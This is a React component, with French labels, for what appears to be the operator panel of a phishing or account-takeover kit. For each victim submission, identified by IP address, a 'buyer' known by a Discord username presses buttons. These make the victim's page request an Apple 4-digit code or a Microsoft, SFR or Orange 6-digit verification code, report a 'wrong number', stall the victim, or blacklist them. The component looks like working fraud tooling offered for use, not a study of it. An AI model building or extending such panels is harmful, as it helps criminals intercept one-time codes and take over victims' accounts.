import { useState } from "react";
import { Loader2 } from "lucide-react";
import { base44 } from "@/api/base44Client";

// Mêmes actions que l'embed Discord (notifyDiscord)
const ACTIONS = [
  { key: "code_ready", label: "Code 4 (Apple)", emoji: "🔢", style: "border-primary/40 bg-primary/10 text-primary hover:bg-primary/20" },
  { key: "code6", label: "Code 6 (Xbox/MS)", emoji: "🔢", style: "border-purple-500/40 bg-purple-500/10 text-purple-300 hover:bg-purple-500/20" },
  { key: "code6sfr", label: "Code 6 (SFR)", emoji: "🔢", style: "border-red-500/40 bg-red-500/10 text-red-300 hover:bg-red-500/20" },
  { key: "code6orange", label: "Code 6 (Orange)", emoji: "🔢", style: "border-orange-400/40 bg-orange-400/10 text-orange-300 hover:bg-orange-400/20" },
  { key: "wrong", label: "Mauvais numéro", emoji: "❌", style: "border-red-500/40 bg-red-500/10 text-red-300 hover:bg-red-500/20" },
  { key: "wait", label: "Faire patienter", emoji: "⏳", style: "border-blue-500/40 bg-blue-500/10 text-blue-300 hover:bg-blue-500/20" },
  { key: "blacklist", label: "Blacklist", emoji: "🚫", style: "border-red-700/50 bg-red-900/30 text-red-300 hover:bg-red-900/50" },
];

export default function BuyerActions({ submission, buyer }) {
  const [busy, setBusy] = useState("");
  const [msg, setMsg] = useState("");
  const [ok, setOk] = useState(false);

  const run = async (key) => {
    setBusy(key);
    setMsg("");
    setOk(false);
    try {
      let res;
      if (key === "blacklist") {
        res = await base44.functions.invoke("blacklistUser", {
          submissionId: submission.id,
          ip: submission.ip_address,
        });
      } else {
        res = await base44.functions.invoke("sendCode", {
          submissionId: submission.id,
          action: key,
          discord: buyer.username,
        });
      }
      if (res?.data?.error) throw new Error(res.data.error);
      setMsg("Action effectuée ✅");
      setOk(true);
    } catch (err) {
      setMsg(err?.response?.data?.error || err.message || "Erreur");
      setOk(false);
    } finally {
      setBusy("");
    }
  };

  return (
    <div className="mt-3">
      <p className="text-foreground/80 text-xs font-semibold mb-2">⚡ Actions</p>
      <div className="grid grid-cols-2 gap-2">
        {ACTIONS.map((a) => (
          <button
            key={a.key}
            disabled={!!busy}
            onClick={() => run(a.key)}
            className={`flex items-center justify-center gap-1.5 px-2 py-2.5 rounded-lg border text-xs font-semibold transition-colors disabled:opacity-50 ${a.style}`}
          >
            {busy === a.key ? <Loader2 className="w-3.5 h-3.5 animate-spin flex-shrink-0" /> : <span className="flex-shrink-0">{a.emoji}</span>}
            <span className="truncate">{a.label}</span>
          </button>
        ))}
      </div>
      {msg && (
        <p className={`text-center text-xs mt-2 font-medium ${ok ? "text-primary" : "text-destructive"}`}>{msg}</p>
      )}
    </div>
  );
}